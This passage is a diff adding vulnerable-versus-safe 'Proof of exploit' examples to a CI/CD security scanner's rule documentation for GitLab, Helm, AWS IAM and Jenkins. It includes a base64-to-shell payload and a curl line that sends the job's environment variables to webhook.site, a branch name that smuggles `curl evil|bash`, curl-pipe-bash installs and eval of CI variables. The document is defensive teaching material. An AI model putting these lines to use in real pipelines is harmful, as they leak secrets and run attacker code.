+# remote-include from a SHA-pinned templates project.
+# An MR can no longer rewrite the build's structure
+# without a separate review on the templates repo.
+include:
+  - project: 'ci/templates'
+    file: '/build.yml'
+    ref: 0123456789abcdef0123456789abcdef01234567
+```
 
 **Source:** [`GL-011`](../providers/gitlab.md#gl-011) in the [GitLab CI provider](../providers/gitlab.md).
 
@@ -6787,6 +10707,28 @@ Fires once per offending IaC file with a finding location pointing at the file. 
 
 - Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``curl | bash`` install one-liner trusts
+# both the network path and the installer host. A
+# MITM or compromised endpoint ships malicious code
+# into the job's shell.
+install:
+  image: alpine@sha256:abc123...
+  script:
+    - curl -fsSL https://installer.example.com/cli.sh | bash
+
+# Safe: download, verify a sha256 digest from a trusted
+# source, then execute.
+install:
+  image: alpine@sha256:abc123...
+  script:
+    - curl -fsSL https://installer.example.com/cli.sh -o /tmp/cli.sh
+    - echo 'a1b2c3d4...  /tmp/cli.sh' | sha256sum -c -
+    - bash /tmp/cli.sh
+```
+
 **Source:** [`GL-016`](../providers/gitlab.md#gl-016) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-017`: Docker run with insecure flags (privileged/host mount) <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-017 }
@@ -6799,6 +10741,31 @@ Fires once per offending IaC file with a finding location pointing at the file. 
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``docker run --privileged`` plus the host
+# Docker socket inside a GitLab Runner job gives the
+# container full kernel access. A compromise escapes
+# to the runner host and from there to every other job
+# sharing it.
+integration:
+  image: docker:24
+  services: [docker:24-dind]
+  script:
+    - docker run --privileged \
+        -v /var/run/docker.sock:/var/run/docker.sock \
+        myapp:test ./integration.sh
+
+# Safe: drop ``--privileged`` and the socket mount. If
+# the job needs to build images, use Kaniko / BuildKit
+# rootless. Run integration tests in a normal container.
+integration:
+  image: myapp@sha256:abc123...
+  script:
+    - ./integration.sh
+```
+
 **Source:** [`GL-017`](../providers/gitlab.md#gl-017) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-018 }
@@ -6810,6 +10777,26 @@ Fires once per offending IaC file with a finding location pointing at the file. 
 **Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: pip uses a plaintext-HTTP index and
+# ``--trusted-host`` silences hash verification.
+install:
+  image: python@sha256:abc123...
+  script:
+    - pip install --index-url http://internal-pypi.example.com/simple
+        --trusted-host internal-pypi.example.com -r requirements.txt
+
+# Safe: HTTPS + ``--require-hashes``. Internal CA
+# installed into the image's trust store.
+install:
+  image: python@sha256:abc123...
+  script:
+    - pip install --index-url https://internal-pypi.example.com/simple
+        --require-hashes -r requirements.txt
+```
 
 **Source:** [`GL-018`](../providers/gitlab.md#gl-018) in the [GitLab CI provider](../providers/gitlab.md).
 
@@ -6832,6 +10819,32 @@ Fires once per offending IaC file with a finding location pointing at the file. 
 **Recommendation.** Never write CI_JOB_TOKEN to files, artifacts, or dotenv reports. Use the token inline in the command that needs it and let GitLab revoke it automatically when the job finishes.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``CI_JOB_TOKEN`` is meant to live only for the
+# duration of the current job — GitLab revokes it when the
+# job ends. Persisting it into a file (especially a dotenv
+# report that GitLab automatically loads into the next job)
+# or an artifact downloadable from the pipeline page extends
+# the credential's reach far beyond its intended scope.
+leak-token:
+  script:
+    - echo "TOKEN=$CI_JOB_TOKEN" >> deploy.env
+  artifacts:
+    reports:
+      dotenv: deploy.env    # propagates TOKEN into every dependent job
+
+# Safe: use the token inline in the one command that needs
+# it. GitLab scopes the token to the job's lifetime and
+# revokes it on exit; nothing downstream can replay it.
+package:
+  script:
+    - curl --header "JOB-TOKEN: $CI_JOB_TOKEN"
+        --upload-file build/output.tar.gz
+        "$CI_API_V4_URL/projects/$CI_PROJECT_ID/packages/generic/app/1.0/output.tar.gz"
+```
 
 **Source:** [`GL-020`](../providers/gitlab.md#gl-020) in the [GitLab CI provider](../providers/gitlab.md).
 
@@ -6873,6 +10886,30 @@ Fires once per offending IaC file with a finding location pointing at the file. 
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``npm config set strict-ssl false`` (or
+# ``git config http.sslverify false`` /
+# ``NODE_TLS_REJECT_UNAUTHORIZED=0``) disables TLS for
+# the rest of the job. A MITM swaps the registry's
+# tarballs in flight.
+install:
+  image: node@sha256:abc123...
+  script:
+    - npm config set strict-ssl false
+    - npm install
+
+# Safe: install the missing CA into the image trust
+# store; keep strict-ssl on.
+install:
+  image: node@sha256:abc123...
+  script:
+    - cp /etc/ssl/internal-ca.crt /usr/local/share/ca-certificates/
+    - update-ca-certificates
+    - npm install
+```
+
 **Source:** [`GL-023`](../providers/gitlab.md#gl-023) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-024 }
@@ -6898,6 +10935,25 @@ Fires once per offending IaC file with a finding location pointing at the file. 
 - Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
 - Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a job body executes a base64-decoded
+# payload, exfils to ``webhook.site``, or runs a known
+# miner binary. A malicious MR (or a compromised co-
+# maintainer) lands the payload in the CI file; every
+# subsequent run executes it.
+build:
+  script:
+    - echo Z2g6Li4uIA== | base64 -d | sh
+    - curl https://webhook.site/abc?env=$(env|base64)
+
+# Safe: the pipeline does only what the pipeline does.
+# If a check fires here, treat as incident response.
+build:
+  script: [make build]
+```
+
 **Source:** [`GL-025`](../providers/gitlab.md#gl-025) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-026`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-026 }
@@ -6911,6 +10967,26 @@ Fires once per offending IaC file with a finding location pointing at the file. 
 **Known false positives.**
 
 - ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``eval`` on a CI variable or extends'd
+# input gives that value full shell-grammar reach.
+# A run-pipeline variable carrying metacharacters
+# executes them.
+deploy:
+  script:
+    - eval "$DEPLOY_CMD"
+    - sh -c $RAW_HOOK
+
+# Safe: invoke a script you own with the value as a
+# quoted argument; let the script validate against an
+# allow-list. Never eval values from CI variables.
+deploy:
+  script:
+    - ./scripts/dispatch.sh "$DEPLOY_CMD"
+```
 
 **Source:** [`GL-026`](../providers/gitlab.md#gl-026) in the [GitLab CI provider](../providers/gitlab.md).
 
@@ -6932,6 +11008,29 @@ Fires once per offending IaC file with a finding location pointing at the file. 
 
 **Recommendation.** Pin every ``services:`` entry the same way ``image:`` is pinned, prefer ``@sha256:<digest>``, or at minimum a full immutable version tag (``postgres:16.2-alpine``). Avoid ``:latest`` and bare tags like ``:16``.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``services:`` references mutable image
+# tags. A publisher repoint (or namespace takeover) on
+# the services image swaps the code that runs alongside
+# every job using the service.
+integration:
+  image: app@sha256:abc123...
+  services:
+    - postgres:15
+    - redis:7
+  script: [pytest]
+
+# Safe: pin every services image to its digest.
+integration:
+  image: app@sha256:abc123...
+  services:
+    - postgres@sha256:def456...   # postgres:15.4
+    - redis@sha256:fed987...      # redis:7.2.4
+  script: [pytest]
+```
+
 **Source:** [`GL-028`](../providers/gitlab.md#gl-028) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-029`: Manual deploy job defaults to allow_failure: true <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-029 }
@@ -6952,6 +11051,32 @@ Fires once per offending IaC file with a finding location pointing at the file. 
 
 **Recommendation.** Pin ``trigger: include: project:`` entries with ``ref:`` set to a tag or commit SHA. Avoid ``trigger: include: remote:`` for untrusted URLs; mirror the content into a trusted project and pin it there.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``trigger:`` ``include:`` pulls a child
+# pipeline definition from a remote project without
+# pinning the ref. Whoever can push to that project's
+# default branch ships child-pipeline content into the
+# parent's run.
+deploy:
+  stage: deploy
+  trigger:
+    include:
+      - project: 'ci/templates'
+        file: '/child-pipeline.yml'
+        # no ref:
+
+# Safe: pin ``ref:`` to a SHA or protected tag.
+deploy:
+  stage: deploy
+  trigger:
+    include:
+      - project: 'ci/templates'
+        file: '/child-pipeline.yml'
+        ref: 0123456789abcdef0123456789abcdef01234567
+```
+
 **Source:** [`GL-030`](../providers/gitlab.md#gl-030) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-031`: id_tokens: missing audience pin or environment binding <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-031 }
@@ -6961,6 +11086,33 @@ Fires once per offending IaC file with a finding location pointing at the file. 
 **How this is detected.** Pairs with IAM-008. IAM-008 verifies the cloud-side trust policy pins audience + subject; this rule verifies the GitLab-side workflow can't request a token without an audience claim or without a deployment gate.
 
 **Recommendation.** For every job that declares an ``id_tokens:`` block, pin a non-wildcard ``aud:`` (a literal string the consumer trusts) AND bind the job to a protected ``environment:``. Audience pinning prevents token replay against unintended consumers; the environment binding gates which refs can drive the assume-role on the consumer side.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``id_tokens:`` mints a JWT with no
+# ``aud:`` pin and no environment binding. The token's
+# subject claim accepts any ref / branch, so an MR
+# pipeline can assume the prod IAM role if the cloud
+# trust policy doesn't tighten ``sub`` itself.
+deploy:
+  id_tokens:
+    AWS_TOKEN:
+      # no aud:, no audience pin
+  script: [aws sts assume-role-with-web-identity ...]
+
+# Safe: pin ``aud:`` to an issuer-specific value AND
+# bind the job to a protected environment with manual
+# approval. The cloud-side trust policy ALSO checks
+# ``sub`` against the project + protected-ref shape.
+deploy:
+  environment:
+    name: production   # protected, reviewer-gated
+  id_tokens:
+    AWS_TOKEN:
+      aud: sts.amazonaws.com
+  script: [aws sts assume-role-with-web-identity ...]
+```
 
 **Source:** [`GL-031`](../providers/gitlab.md#gl-031) in the [GitLab CI provider](../providers/gitlab.md).
 
@@ -6977,6 +11129,29 @@ Fires once per offending IaC file with a finding location pointing at the file. 
 **Known false positives.**
 
 - Workflows that intentionally select runners by environment via a vetted ``variables:`` block (``RUNNER_TAG: deploy-prod``) referencing a build-time-set value are out of scope, the rule only matches the curated untrusted-predefined-variable catalog. Static custom variables (``$DEPLOY_FLEET`` defined inside the workflow file) are intentionally not flagged.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``tags:`` interpolates a CI variable. A
+# pusher controls ``$CI_COMMIT_REF_NAME`` (the branch
+# name) and can name their MR branch after a privileged
+# runner tag (e.g. ``shell-runner-prod``). The MR build
+# routes to that runner pool and accesses tokens /
+# secrets meant for protected pipelines only.
+build:
+  tags:
+    - $CI_COMMIT_REF_NAME
+  script: [./deploy.sh]
+
+# Safe: pin runner tags to static literals. Protected
+# runners should additionally be configured as
+# protected-only in GitLab Settings so MR pipelines
+# can't reach them even if the YAML drifts.
+build:
+  tags: [linux-amd64]
+  script: [./deploy.sh]
+```
 
 **Source:** [`GL-032`](../providers/gitlab.md#gl-032) in the [GitLab CI provider](../providers/gitlab.md).
 
@@ -7000,6 +11175,32 @@ for direct interpolation of the same attacker-controllable predefined variables 
 **Known false positives.**
 
 - Some self-hosted GitLab installations build a diagnostic banner into the global ``before_script`` that ``echo``s commit metadata for log-correlation purposes. Suppress per pipeline file rather than globally, the rule is checking propagation reach, not intent.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a global ``before_script:`` (or
+# ``after_script:``) interpolates an untrusted CI
+# variable. The injected metacharacters then execute
+# in every job that inherits the global block, which
+# usually means every job in the pipeline.
+before_script:
+  - echo "Building $CI_COMMIT_MESSAGE"   # message is attacker-controllable
+build:
+  script: [make build]
+test:
+  script: [make test]
+
+# Safe: assign the untrusted source to a local variable
+# and quote on every use. Pulling the value into a
+# variable AT MOST ONCE per job keeps the injection
+# surface to a single quoted reference.
+before_script:
+  - MSG="$CI_COMMIT_MESSAGE"
+  - echo "Building $MSG"
+build:
+  script: [make build]
+```
 
 **Source:** [`GL-033`](../providers/gitlab.md#gl-033) in the [GitLab CI provider](../providers/gitlab.md).
 
@@ -7081,6 +11282,42 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 
 - Charts with no dependencies (the ``dependencies:`` key is absent or empty) pass automatically. There is nothing to lock.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``Chart.yaml`` declares a redis dependency by
+# version range but ``Chart.lock`` is absent. ``helm
+# dependency build`` resolves the range against whatever the
+# chart repo serves at install time. A compromised repo (or
+# a malicious chart cache) substitutes a backdoored redis-
+# 17.x tarball; the consuming cluster runs it.
+# Chart.yaml
+apiVersion: v2
+name: my-app
+version: 1.0.0
+dependencies:
+  - name: redis
+    version: ^17.0.0
+    repository: https://charts.bitnami.com/bitnami
+# Chart.lock missing entirely — no integrity gate on
+# ``helm dependency build``
+
+# Safe: run ``helm dependency update`` and commit
+# ``Chart.lock``. ``digest:`` is the sha256 of the resolved
+# tarball; ``helm dependency build`` re-fetches and verifies
+# the digest before unpacking. A swapped tarball changes the
+# digest and the build fails loud instead of silently
+# installing the substitute.
+# Chart.lock
+dependencies:
+  - name: redis
+    repository: https://charts.bitnami.com/bitnami
+    version: 17.15.4
+    digest: sha256:abc123def456abc123def456abc123def456abc123def456abc123def456abcd
+digest: sha256:9876543210fedcba9876543210fedcba9876543210fedcba9876543210fedcba
+generated: "2026-01-15T10:30:00Z"
+```
+
 **Source:** [`HELM-002`](../providers/helm.md) in the [Helm provider](../providers/helm.md).
 
 ### `HELM-003`: Chart dependency declared on a non-HTTPS repository <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-helm-003 }
@@ -7097,6 +11334,44 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 **Recommendation.** Switch each ``dependencies[].repository`` value to an ``https://`` chart repo URL, an ``oci://`` registry reference, or a ``file://`` path for in-repo charts. Plaintext ``http://`` (and other non-TLS schemes like ``git://``) lets any on-path attacker substitute the dependency tarball during ``helm dependency build``; ``Chart.lock``'s digest check (HELM-002) only catches that on the *next* update, not the compromised pull itself.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``helm dependency build`` fetches the redis
+# tarball over plaintext HTTP. Any on-path attacker
+# (compromised proxy, malicious WiFi, BGP hijack on the
+# internal mirror) substitutes a backdoored tarball; the
+# consuming cluster unpacks it into the umbrella chart.
+# ``Chart.lock``'s digest check (HELM-002) only catches
+# this on the *next* update, not the compromised pull
+# itself.
+apiVersion: v2
+name: my-app
+version: 1.0.0
+dependencies:
+  - name: redis
+    version: 17.15.4
+    repository: http://internal-charts.example.com
+
+# Safe: HTTPS gives TLS for the fetch; an OCI registry
+# reference (``oci://``) goes through the registry's TLS
+# config; a ``file://`` reference reads from disk inside
+# the same repo, so there's no network surface at all.
+apiVersion: v2
+name: my-app
+version: 1.0.0
+dependencies:
+  - name: redis
+    version: 17.15.4
+    repository: https://charts.bitnami.com/bitnami
+  - name: postgres
+    version: 12.1.0
+    repository: oci://registry.example.com/charts
+  - name: my-sidecar
+    version: 0.1.0
+    repository: file://../sidecar
+```
 
 **Source:** [`HELM-003`](../providers/helm.md) in the [Helm provider](../providers/helm.md).
 
@@ -7357,6 +11632,42 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 
 **Recommendation.** Add a Condition requiring sts:ExternalId for external principals.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a role with a cross-account trust policy
+# missing ``sts:ExternalId`` in its Condition. The
+# Confused Deputy problem: a third-party SaaS (or
+# another team in another org) that AWS uses your
+# ARN with can be tricked into using it on the wrong
+# customer's behalf.
+{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Allow",
+    "Principal": {"AWS": "arn:aws:iam::999999999999:root"},
+    "Action": "sts:AssumeRole"
+  }]
+}
+
+# Safe: require ``sts:ExternalId`` matching a value
+# the third party shares only with your tenant. Even
+# if the third-party SaaS is tricked into assuming
+# your role on a different customer's behalf, the
+# AssumeRole fails without the matching ExternalId.
+{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Allow",
+    "Principal": {"AWS": "arn:aws:iam::999999999999:root"},
+    "Action": "sts:AssumeRole",
+    "Condition": {
+      "StringEquals": {"sts:ExternalId": "e7c1a0b3-abc-tenant-id"}
+    }
+  }]
+}
+```
+
 **Source:** [`IAM-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `IAM-006`: Sensitive actions granted with wildcard Resource <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-iam-006 }
@@ -7377,6 +11688,36 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 
 **Recommendation.** Rotate or delete IAM access keys older than 90 days. Long-lived static credentials are the #1 way compromised CI credentials get reused across environments, prefer short-lived STS tokens via OIDC federation or an assumed role.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: an IAM user has an active access key older
+# than 90 days. Long-lived keys accumulate exposure: any
+# leak (laptop theft, .aws/credentials gitignore miss,
+# accidental commit, log echo) yields a key still valid
+# years later. AWS best practice is 90-day rotation.
+import boto3, datetime
+iam = boto3.client('iam')
+keys = iam.list_access_keys(UserName='ci-bot')['AccessKeyMetadata']
+for k in keys:
+    age = (datetime.datetime.now(datetime.UTC) - k['CreateDate']).days
+    print(k['AccessKeyId'], age, 'days')   # 412 days, still Active
+
+# Safe: rotate on a schedule. The strongest fix is to
+# eliminate IAM users entirely for service identities
+# (federate via OIDC / IAM Roles Anywhere / instance
+# profiles). For human users, enforce rotation via
+# IAM SCP and an automation that deactivates keys
+# older than 90 days.
+iam.update_access_key(
+    UserName='ci-bot', AccessKeyId='AKIA...OLD',
+    Status='Inactive'
+)
+iam.delete_access_key(
+    UserName='ci-bot', AccessKeyId='AKIA...OLD'
+)
+```
+
 **Source:** [`IAM-007`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `IAM-008`: OIDC-federated role trust policy missing audience or subject pin <span class="pg-sev pg-sev--high">HIGH</span> { #detail-iam-008 }
@@ -7386,6 +11727,46 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 **How this is detected.** IAM-005 already covers cross-account AWS principals. This rule targets the OIDC federation path specifically because the blast radius of a missed audience/subject pin is the entire identity provider's tenant base (e.g. all GitHub users, not just your org).
 
 **Recommendation.** Every Allow statement that trusts a federated OIDC provider (``token.actions.githubusercontent.com``, GitLab, CircleCI, Terraform Cloud, etc.) must pin both the audience (``...:aud = sts.amazonaws.com``) and a subject prefix (``...:sub`` matching ``repo:myorg/*``). Without these, any workflow from any tenant can assume the role.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: an OIDC-federated IAM role's trust policy
+# is missing either the audience (``:aud``) check or
+# the subject (``:sub``) pin. Any OIDC token from the
+# named provider — even one minted for a different
+# audience or a different repo / branch — can assume
+# the role.
+{
+  "Statement": [{
+    "Effect": "Allow",
+    "Principal": {"Federated":
+      "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"},
+    "Action": "sts:AssumeRoleWithWebIdentity"
+    // no Condition
+  }]
+}
+
+# Safe: pin BOTH ``:aud`` (the audience the token was
+# minted for, typically ``sts.amazonaws.com``) AND
+# ``:sub`` (the specific repo + branch / environment).
+# Reject any token whose claims don't match.
+{
+  "Statement": [{
+    "Effect": "Allow",
+    "Principal": {"Federated":
+      "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"},
+    "Action": "sts:AssumeRoleWithWebIdentity",
+    "Condition": {
+      "StringEquals": {
+        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
+        "token.actions.githubusercontent.com:sub":
+          "repo:myorg/myrepo:environment:production"
+      }
+    }
+  }]
+}
+```
 
 **Source:** [`IAM-008`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -7397,6 +11778,47 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 
 **Recommendation.** Pin every `@Library('name@<ref>')` to a release tag (e.g. `@v1.4.2`) or a 40-char commit SHA. Configure the library in Jenkins with 'Allow default version to be overridden' disabled so a pipeline can't escape the pin.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: every build resolves @main against the
+// shared-library repo. A push to main (legitimate update
+// from a teammate, a credential leak, a compromised
+// maintainer account) is silently picked up on the next
+// pipeline run with the build's full credential set in
+// scope (CI_JOB_TOKEN-equivalent, Jenkins credentials,
+// agent secrets).
+@Library('build-utils@main') _
+
+pipeline {
+  agent any
+  stages {
+    stage('deploy') {
+      steps {
+        deployToProd()  // sourced from the shared library
+      }
+    }
+  }
+}
+
+// Safe: pin to a release tag (or 40-char commit SHA) and
+// disable 'Allow default version to be overridden' on the
+// library config in Jenkins so a pipeline can't escape
+// the pin by re-declaring the @Library line.
+@Library('build-utils@v1.4.2') _
+
+pipeline {
+  agent any
+  stages {
+    stage('deploy') {
+      steps {
+        deployToProd()
+      }
+    }
+  }
+}
+```
+
 **Source:** [`JF-001`](../providers/jenkins.md#jf-001) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `JF-002`: Script step interpolates attacker-controllable env var <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-002 }
@@ -7406,6 +11828,46 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 **How this is detected.** $BRANCH_NAME / $GIT_BRANCH / $TAG_NAME / $CHANGE_* are populated from SCM event metadata the attacker controls. Single-quoted Groovy strings don't interpolate so they're safe; only double-quoted / triple-double-quoted bodies are flagged.
 
 **Recommendation.** Switch the affected `sh`/`bat`/`powershell` step to a single-quoted string (Groovy doesn't interpolate single quotes), and pass values through a quoted shell variable (`sh 'echo "$BRANCH"'` after `withEnv([...])`).
+
+**Proof of exploit.**
+
+```
+// Vulnerable: ``$CHANGE_BRANCH`` (or ``$GIT_BRANCH`` /
+// ``$ghprbSourceBranch`` / ``$BUILD_USER``) comes from
+// branch metadata or build cause. A branch named
+// ``feat;curl evil|bash;`` lands in the sh body verbatim;
+// the injected curl runs in the build's shell.
+pipeline {
+  agent any
+  stages {
+    stage('build') {
+      steps {
+        sh "echo Building $CHANGE_BRANCH"
+        sh "./build.sh --branch $CHANGE_BRANCH"
+      }
+    }
+  }
+}
+
+// Safe: pass the untrusted value through a Groovy-side
+// env binding and reference the shell var with quoting.
+// Groovy's single-quoted string never interpolates;
+// the value reaches sh as one literal argument.
+pipeline {
+  agent any
+  stages {
+    stage('build') {
+      steps {
+        sh '''
+          branch="$CHANGE_BRANCH"
+          echo "Building $branch"
+          ./build.sh --branch "$branch"
+        '''
+      }
+    }
+  }
+}
+```
 
 **Source:** [`JF-002`](../providers/jenkins.md#jf-002) in the [Jenkins provider](../providers/jenkins.md).
 
@@ -7475,6 +11937,48 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 
 - Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: a credential-shaped literal in the
+// Jenkinsfile body. Any repo reader sees it; the
+// console log echoes it whenever the step prints env.
+pipeline {
+  agent any
+  environment {
+    AWS_ACCESS_KEY_ID = 'AKIAIOSFODNN7EXAMPLE'
+    AWS_SECRET_ACCESS_KEY = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
+  }
+  stages {
+    stage('upload') {
+      steps {
+        sh 'aws s3 cp ./build s3://bucket/'
+      }
+    }
+  }
+}
+
+// Safe: bind a Jenkins Credentials entry via
+// withCredentials. The secret resolves at runtime,
+// is masked in console output, rotates in the
+// Credentials store.
+pipeline {
+  agent any
+  stages {
+    stage('upload') {
+      steps {
+        withCredentials([usernamePassword(
+          credentialsId: 'aws-uploader',
+          usernameVariable: 'AWS_ACCESS_KEY_ID',
+          passwordVariable: 'AWS_SECRET_ACCESS_KEY')]) {
+          sh 'aws s3 cp ./build s3://bucket/'
+        }
+      }
+    }
+  }
+}
+```
+
 **Source:** [`JF-008`](../providers/jenkins.md#jf-008) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `JF-009`: Agent docker image not pinned to sha256 digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-009 }
@@ -7484,6 +11988,37 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 **How this is detected.** `agent { docker { image 'name:tag' } }` is not digest-pinned, so a repointed registry tag silently swaps the executor under every subsequent build. Unlike the YAML providers, Jenkins has no separate tag-pinning check, so this one fires at HIGH regardless of whether the tag is floating or immutable.
 
 **Recommendation.** Resolve each image to its current digest (`docker buildx imagetools inspect <ref>` prints it) and reference it via `image '<repo>@sha256:<digest>'`. Automate refreshes with Renovate.
+
+**Proof of exploit.**
+
+```
+// Vulnerable: ``image 'maven:3.9'`` is a mutable tag.
+// Docker Hub's maven team rebuilds it on every Maven
+// point release; a publisher takeover ships code into
+// every Jenkins build using the tag.
+pipeline {
+  agent {
+    docker { image 'maven:3.9' }
+  }
+  stages {
+    stage('build') {
+      steps { sh 'mvn -B verify' }
+    }
+  }
+}
+
+// Safe: pin to the content-addressable digest.
+pipeline {
+  agent {
+    docker { image 'maven@sha256:abc123...' }  // maven:3.9.5-eclipse-temurin-21
+  }
+  stages {
+    stage('build') {
+      steps { sh 'mvn -B verify' }
+    }
+  }
+}
+```
 
 **Source:** [`JF-009`](../providers/jenkins.md#jf-009) in the [Jenkins provider](../providers/jenkins.md).
 
@@ -7496,6 +12031,46 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 **Recommendation.** Replace the literal with a credentials-store reference: `AWS_ACCESS_KEY_ID = credentials('aws-prod-key')`. Better: switch to the AWS plugin's role binding (`withAWS(role: 'arn:…')`) so the build assumes a short-lived role per run.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+// Vulnerable: long-lived AWS keys hard-coded in
+// ``environment { }`` block. Same leak surface as
+// JF-008 plus the long-lived-credential gap (no
+// rotation, full account access for as long as the
+// repo reader keeps the value).
+pipeline {
+  agent any
+  environment {
+    AWS_ACCESS_KEY_ID = 'AKIAIOSFODNN7EXAMPLE'
+    AWS_SECRET_ACCESS_KEY = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
+  }
+  stages {
+    stage('deploy') {
+      steps { sh 'aws deploy ...' }
+    }
+  }
+}
+
+// Safe: federate via Jenkins OIDC plugin (or
+// instance-profile / IRSA on a Kubernetes agent) so
+// the keys never exist as long-lived material. The
+// trust policy on the IAM role pins the Jenkins
+// instance / branch as the subject.
+pipeline {
+  agent any
+  stages {
+    stage('deploy') {
+      steps {
+        withAWS(role: 'arn:aws:iam::123:role/deploy', useNode: true) {
+          sh 'aws deploy ...'
+        }
+      }
+    }
+  }
+}
+```
 
 **Source:** [`JF-010`](../providers/jenkins.md#jf-010) in the [Jenkins provider](../providers/jenkins.md).
 
@@ -7528,6 +12103,54 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 **How this is detected.** Recognizes both `copyArtifacts(projectName: ...)` and the older `step([$class: 'CopyArtifact', ...])` form. If the upstream job accepts multibranch or PR builds, the artifact may have been produced by attacker-controlled code.
 
 **Recommendation.** Add a verification step before consuming the artifact: `sh 'sha256sum -c manifest.sha256'` against a manifest the producer signed, or `cosign verify` over the artifact directly. Restrict the upstream job to non-PR builds via branch protection if verification isn't feasible.
+
+**Proof of exploit.**
+
+```
+// Vulnerable: ``app-build`` is a multibranch job that runs
